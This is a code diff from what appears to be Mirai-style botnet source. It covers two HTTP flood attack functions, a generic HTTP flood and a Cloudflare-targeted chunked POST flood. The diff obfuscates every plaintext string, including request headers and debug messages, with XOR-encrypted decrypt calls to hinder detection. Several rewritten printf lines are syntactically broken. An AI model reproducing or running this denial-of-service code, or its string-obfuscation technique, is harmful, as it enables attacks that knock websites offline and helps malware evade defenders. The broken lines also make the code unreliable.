@@ -28,9 +28,9 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     int i, ii, rfd, ret = 0;
     struct attack_http_state *http_table = NULL;
     char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
-    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
+    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, (char*)util_decrypt("\x4D\x4F\x5E\x0A", 4));
     char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
-    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
+    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, (char*)util_decrypt("\x25\x0A", 2));
     int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
 
@@ -172,7 +172,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 conn->state = HTTP_CONN_CONNECTING;
                 connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 #ifdef DEBUG
-                printf("[http flood] fd%d started connect\n", conn->fd);
+                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x6C\x6E\x2F\x6E\x2A\x79\x7E\x6B\x78\x7E\x6F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x00\x0A", 35), conn->fd);
 #endif
 
                 FD_SET(conn->fd, &fdset_wr);
@@ -201,35 +201,35 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 conn->rdbuf_pos = 0;
 
 #ifdef DEBUG
-                //printf("[http flood] Sending http request\n");
+                //printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x59\x6F\x64\x6E\x63\x64\x6D\x2A\x62\x7E\x7E\x7A\x2A\x78\x6F\x7B\x7F\x6F\x79\x7E\x00\x0A", 35));
 #endif
 
                 char buf[10240];
                 util_zero(buf, 10240);
 
                 util_strcpy(buf + util_strlen(buf), conn->method);
-                util_strcpy(buf + util_strlen(buf), " ");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x0A", 2));
                 util_strcpy(buf + util_strlen(buf), conn->path);
-                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x42\x5E\x5E\x5A\x25\x3B\x24\x3B\x07\x00\x5F\x79\x6F\x78\x27\x4B\x6D\x6F\x64\x7E\x30\x2A\x0A", 24));
                 util_strcpy(buf + util_strlen(buf), conn->user_agent);
-                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x42\x65\x79\x7E\x30\x2A\x0A", 9));
                 util_strcpy(buf + util_strlen(buf), conn->domain);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                 table_lock_val(TABLE_ATK_KEEP_ALIVE);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_ACCEPT);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                 table_lock_val(TABLE_ATK_ACCEPT);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                 table_lock_val(TABLE_ATK_ACCEPT_LNG);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 if (postdata != NULL)
                 {
@@ -237,25 +237,25 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                     util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                     table_lock_val(TABLE_ATK_CONTENT_TYPE);
 
-                    util_strcpy(buf + util_strlen(buf), "\r\n");
+                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
                     util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
-                    util_strcpy(buf + util_strlen(buf), " ");
+                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x0A", 2));
                     util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
-                    util_strcpy(buf + util_strlen(buf), "\r\n");
+                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
                 }
 
                 if (conn->num_cookies > 0)
                 {
-                    util_strcpy(buf + util_strlen(buf), "Cookie: ");
+                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x49\x65\x65\x61\x63\x6F\x30\x2A\x0A", 9));
                     for (ii = 0; ii < conn->num_cookies; ii++)
                     {
                         util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
-                        util_strcpy(buf + util_strlen(buf), "; ");
+                        util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x31\x2A\x0A", 3));
                     }
-                    util_strcpy(buf + util_strlen(buf), "\r\n");
+                    util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
                 }
 
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 if (postdata != NULL)
                     util_strcpy(buf + util_strlen(buf), postdata);
@@ -266,7 +266,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 #ifdef DEBUG
                 if (sockets == 1)
                 {
-                    printf("sending buf: \"%s\"\n", buf);
+                    printf((char*)util_decrypt("\x79\x6F\x64\x6E\x63\x64\x6D\x2A\x68\x7F\x6C\x30\x2A\x56\x0A", 15)%s\(char*)util_decrypt("\x00\x0A", 2), buf);
                 }
 #endif
 
@@ -338,14 +338,14 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 if (err == 0 && ret == 0)
                 {
 #ifdef DEBUG
-                    printf("[http flood] FD%d connected.\n", conn->fd);
+                    printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x6F\x6E\x24\x00\x0A", 30), conn->fd);
 #endif
                         conn->state = HTTP_CONN_SEND;
                 }
                 else
                 {
 #ifdef DEBUG
-                    printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
+                    printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x6F\x78\x78\x65\x78\x2A\x7D\x62\x63\x66\x6F\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x64\x6D\x2A\x37\x2A\x2F\x6E\x00\x0A", 47), conn->fd, err);
 #endif
                     close(conn->fd);
                     conn->fd = -1;
@@ -371,14 +371,14 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
 
                     // we want to process a full http header (^:
-                    if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
+                    if (util_memsearch(generic_memes, ret, (char*)util_decrypt("\x07\x00\x07\x00\x0A", 5), 4) == -1 && ret < 10240)
                         continue;
 
-                    generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;
+                    generic_memes[util_memsearch(generic_memes, ret, (char*)util_decrypt("\x07\x00\x07\x00\x0A", 5), 4)] = 0;
 
 #ifdef DEBUG
                     if (sockets == 1)
-                        printf("[http flood] headers: \"%s\"\n", generic_memes);
+                        printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x62\x6F\x6B\x6E\x6F\x78\x79\x30\x2A\x56\x0A", 24)%s\(char*)util_decrypt("\x00\x0A", 2), generic_memes);
 #endif
 
                     if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
@@ -394,7 +394,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (generic_memes[offset] == ' ')
                             offset++;
 
-                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
+                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                         if (nl_off != -1)
                         {
                             char *con_ptr = &(generic_memes[offset]);
@@ -415,7 +415,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (generic_memes[offset] == ' ')
                             offset++;
 
-                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
+                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                         if (nl_off != -1)
                         {
                             char *con_ptr = &(generic_memes[offset]);
@@ -435,7 +435,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (generic_memes[offset] == ' ')
                             offset++;
 
-                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
+                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                         if (nl_off != -1)
                         {
                             char *len_ptr = &(generic_memes[offset]);
@@ -457,7 +457,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (generic_memes[processed + offset] == ' ')
                             offset++;
 
-                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2);
+                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                         if (nl_off != -1)
                         {
                             char *cookie_ptr = &(generic_memes[processed + offset]);
@@ -465,8 +465,8 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                             if (nl_off >= 2)
                                 nl_off -= 2;
 
-                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) > 0)
-                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) - 1;
+                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, (char*)util_decrypt("\x31\x0A", 2), 1) > 0)
+                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, (char*)util_decrypt("\x31\x0A", 2), 1) - 1;
 
                             generic_memes[processed + offset + nl_off] = 0;
 
@@ -507,7 +507,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (generic_memes[offset] == ' ')
                             offset++;
 
-                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
+                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                         if (nl_off != -1)
                         {
                             char *loc_ptr = &(generic_memes[offset]);
@@ -519,7 +519,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                             //increment it one so that it is length of the string excluding null char instead of 0-based offset
                             nl_off++;
 
-                            if (util_memsearch(loc_ptr, nl_off, "http", 4) == 4)
+                            if (util_memsearch(loc_ptr, nl_off, (char*)util_decrypt("\x62\x7E\x7E\x7A\x0A", 5), 4) == 4)
                             {
                                 //this is an absolute url, domain name change maybe?
                                 ii = 7;
@@ -571,7 +571,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (generic_memes[offset] == ' ')
                             offset++;
 
-                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
+                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                         if (nl_off != -1)
                         {
                             char *loc_ptr = &(generic_memes[offset]);
@@ -597,8 +597,8 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                                 if (loc_ptr[ii] == ' ')
                                     ii++;
 
-                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=") != -1)
-                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=");
+                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), (char*)util_decrypt("\x7F\x78\x66\x37\x0A", 5)) != -1)
+                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), (char*)util_decrypt("\x7F\x78\x66\x37\x0A", 5));
 
                                 if (loc_ptr[ii] == '"')
                                 {
@@ -618,7 +618,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                                 loc_ptr = &(loc_ptr[ii]);
 
 
-                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
+                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), (char*)util_decrypt("\x62\x7E\x7E\x7A\x0A", 5)) == 4)
                                 {
                                     //this is an absolute url, domain name change maybe?
                                     ii = 7;
@@ -662,7 +662,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                                     }
                                 }
 
-                                strcpy(conn->method, "GET");
+                                strcpy(conn->method, (char*)util_decrypt("\x4D\x4F\x5E\x0A", 4));
                                 // queue the state up for the next time
                                 conn->state = HTTP_CONN_QUEUE_RESTART;
                                 continue;
@@ -671,9 +671,9 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                     }
 
                     // actually pull the content from the buffer that we processed via MSG_PEEK
-                    processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);
+                    processed = util_memsearch(generic_memes, ret, (char*)util_decrypt("\x07\x00\x07\x00\x0A", 5), 4);
 
-                    if (util_strcmp(conn->method, "POST") || util_strcmp(conn->method, "GET"))
+                    if (util_strcmp(conn->method, (char*)util_decrypt("\x5A\x45\x59\x5E\x0A", 5)) || util_strcmp(conn->method, (char*)util_decrypt("\x4D\x4F\x5E\x0A", 4)))
                         conn->state = HTTP_CONN_RECV_BODY;
                     else if (ret > processed)
                         conn->state = HTTP_CONN_QUEUE_RESTART;
@@ -700,7 +700,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (ret == 0)
                         {
 #ifdef DEBUG
-                            printf("[http flood] FD%d connection gracefully closed\n", conn->fd);
+                            printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x6D\x78\x6B\x69\x6F\x6C\x7F\x66\x66\x73\x2A\x69\x66\x65\x79\x6F\x6E\x00\x0A", 48), conn->fd);
 #endif
                             errno = ECONNRESET;
                             ret = -1; // Fall through to closing connection below
@@ -710,7 +710,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                             if (errno != EAGAIN && errno != EWOULDBLOCK)
                             {
 #ifdef DEBUG
-                                printf("[http flood] FD%d lost connection\n", conn->fd);
+                                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x66\x65\x79\x7E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x00\x0A", 35), conn->fd);
 #endif
                                 close(conn->fd);
                                 conn->fd = -1;
@@ -738,16 +738,16 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                                     if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                     {
                                         int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
-                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
+                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, (char*)util_decrypt("\x2D\x0A", 2), 1);
                                         conn->rdbuf[start_pos + (end_pos - 1)] = 0;
 
                                         if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                         {
                                             util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
-                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), "=");
+                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), (char*)util_decrypt("\x37\x0A", 2));
 
                                             start_pos += end_pos + 3;
-                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
+                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, (char*)util_decrypt("\x2D\x0A", 2), 1);
                                             conn->rdbuf[start_pos + (end_pos - 1)] = 0;
 
                                             util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
@@ -765,12 +765,12 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                             {
                                 if (conn->chunked == 1)
                                 {
-                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2) != -1)
+                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, (char*)util_decrypt("\x07\x00\x0A", 3), 2) != -1)
                                     {
-                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2);
+                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, (char*)util_decrypt("\x07\x00\x0A", 3), 2);
                                         conn->rdbuf[new_line_pos - 2] = 0;
-                                        if (util_memsearch(conn->rdbuf, new_line_pos, ";", 1) != -1)
-                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, ";", 1)] = 0;
+                                        if (util_memsearch(conn->rdbuf, new_line_pos, (char*)util_decrypt("\x31\x0A", 2), 1) != -1)
+                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, (char*)util_decrypt("\x31\x0A", 2), 1)] = 0;
 
                                         int chunklen = util_atoi(conn->rdbuf, 16);
 
@@ -815,7 +815,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         if (ret == 0)
                         {
 #ifdef DEBUG
-                            printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed\n", conn->fd);
+                            printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x42\x5E\x5E\x5A\x55\x49\x45\x44\x44\x55\x5B\x5F\x4F\x5F\x4F\x55\x58\x4F\x59\x5E\x4B\x58\x5E\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x6D\x78\x6B\x69\x6F\x6C\x7F\x66\x66\x73\x2A\x69\x66\x65\x79\x6F\x6E\x00\x0A", 72), conn->fd);
 #endif
                             errno = ECONNRESET;
                             ret = -1; // Fall through to closing connection below
@@ -825,7 +825,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                             if (errno != EAGAIN && errno != EWOULDBLOCK)
                             {
 #ifdef DEBUG
-                                printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection\n", conn->fd);
+                                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x42\x5E\x5E\x5A\x55\x49\x45\x44\x44\x55\x5B\x5F\x4F\x5F\x4F\x55\x58\x4F\x59\x5E\x4B\x58\x5E\x2A\x4C\x4E\x2F\x6E\x2A\x66\x65\x79\x7E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x00\x0A", 59), conn->fd);
 #endif
                                 close(conn->fd);
                                 conn->fd = -1;
@@ -845,7 +845,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 #ifdef DEBUG
         if (sockets == 1)
         {
-            printf("debug mode sleep\n");
+            printf((char*)util_decrypt("\x6E\x6F\x68\x7F\x6D\x2A\x67\x65\x6E\x6F\x2A\x79\x66\x6F\x6F\x7A\x00\x0A", 18));
             sleep(1);
         }
 #endif
@@ -955,7 +955,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 conn->state = HTTP_CONN_CONNECTING;
                 connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 #ifdef DEBUG
-                printf("[http flood] fd%d started connect\n", conn->fd);
+                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x6C\x6E\x2F\x6E\x2A\x79\x7E\x6B\x78\x7E\x6F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x00\x0A", 35), conn->fd);
 #endif
 
                 FD_SET(conn->fd, &fdset_wr);
@@ -979,58 +979,58 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
             else if (conn->state == HTTP_CONN_SEND_HEADERS)
             {
 #ifdef DEBUG
-                //printf("[http flood] Sending http request\n");
+                //printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x59\x6F\x64\x6E\x63\x64\x6D\x2A\x62\x7E\x7E\x7A\x2A\x78\x6F\x7B\x7F\x6F\x79\x7E\x00\x0A", 35));
 #endif
 
                 char buf[10240];
                 util_zero(buf, 10240);
 
-                //util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/l/chk_captcha HTTP/1.1\r\nUser-Agent: ");
-                util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/");
+                //util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x5A\x45\x59\x5E\x2A\x25\x69\x6E\x64\x27\x69\x6D\x63\x25\x66\x25\x69\x62\x61\x55\x69\x6B\x7A\x7E\x69\x62\x6B\x2A\x42\x5E\x5E\x5A\x25\x3B\x24\x3B\x07\x00\x5F\x79\x6F\x78\x27\x4B\x6D\x6F\x64\x7E\x30\x2A\x0A", 51));
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x5A\x45\x59\x5E\x2A\x25\x69\x6E\x64\x27\x69\x6D\x63\x25\x0A", 15));
                 rand_alphastr(buf + util_strlen(buf), 16);
-                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x42\x5E\x5E\x5A\x25\x3B\x24\x3B\x07\x00\x5F\x79\x6F\x78\x27\x4B\x6D\x6F\x64\x7E\x30\x2A\x0A", 24));
                 util_strcpy(buf + util_strlen(buf), conn->user_agent);
-                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x42\x65\x79\x7E\x30\x2A\x0A", 9));
                 util_strcpy(buf + util_strlen(buf), conn->domain);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                 table_lock_val(TABLE_ATK_KEEP_ALIVE);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_ACCEPT);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                 table_lock_val(TABLE_ATK_ACCEPT);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                 table_lock_val(TABLE_ATK_ACCEPT_LNG);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                 table_lock_val(TABLE_ATK_CONTENT_TYPE);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                 table_lock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
-                util_strcpy(buf + util_strlen(buf), " ");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x0A", 2));
                 table_unlock_val(TABLE_ATK_CHUNKED);
                 util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CHUNKED, NULL));
                 table_lock_val(TABLE_ATK_CHUNKED);
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
-                util_strcpy(buf + util_strlen(buf), "\r\n");
+                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));
 
                 conn->to_send = (80 * 1024 * 1024);
 
 #ifdef DEBUG
                 if (sockets == 1)
                 {
-                    printf("sending buf: \"%s\"\n", buf);
+                    printf((char*)util_decrypt("\x79\x6F\x64\x6E\x63\x64\x6D\x2A\x68\x7F\x6C\x30\x2A\x56\x0A", 15)%s\(char*)util_decrypt("\x00\x0A", 2), buf);
                 }
 #endif
 
@@ -1052,7 +1052,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
                 if (conn->to_send <= 0)
                 {
-                    send(conn->fd, "0\r\n", 3, MSG_NOSIGNAL);
+                    send(conn->fd, (char*)util_decrypt("\x3A\x07\x00\x0A", 4), 3, MSG_NOSIGNAL);
                 } else {
                     // EZZZZZZZZZ HACKS
                     if (conn->to_send < 1024)
@@ -1064,7 +1064,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                         util_zero(szbuf, 4);
                         util_itoa(1024, 16, szbuf);
                         send(conn->fd, szbuf, util_strlen(szbuf), MSG_NOSIGNAL);
-                        send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                        send(conn->fd, (char*)util_decrypt("\x07\x00\x0A", 3), 2, MSG_NOSIGNAL);
                     }
 
                     if ((sent = send(conn->fd, rndbuf, util_strlen(rndbuf), MSG_NOSIGNAL)) == -1)
@@ -1132,14 +1132,14 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                     if (err == 0 && ret == 0)
                     {
 #ifdef DEBUG
-                        printf("[http flood] FD%d connected.\n", conn->fd);
+                        printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x6F\x6E\x24\x00\x0A", 30), conn->fd);
 #endif
                         conn->state = HTTP_CONN_SEND;
                     }
                     else
                     {
 #ifdef DEBUG
-                        printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
+                        printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x6F\x78\x78\x65\x78\x2A\x7D\x62\x63\x66\x6F\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x64\x6D\x2A\x37\x2A\x2F\x6E\x00\x0A", 47), conn->fd, err);
 #endif
                         close(conn->fd);
                         conn->fd = -1;
@@ -1166,7 +1166,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 #ifdef DEBUG
         if (sockets == 1)
         {
-            printf("debug mode sleep\n");
+            printf((char*)util_decrypt("\x6E\x6F\x68\x7F\x6D\x2A\x67\x65\x6E\x6F\x2A\x79\x66\x6F\x6F\x7A\x00\x0A", 18));
             sleep(1);
         }
 #endif
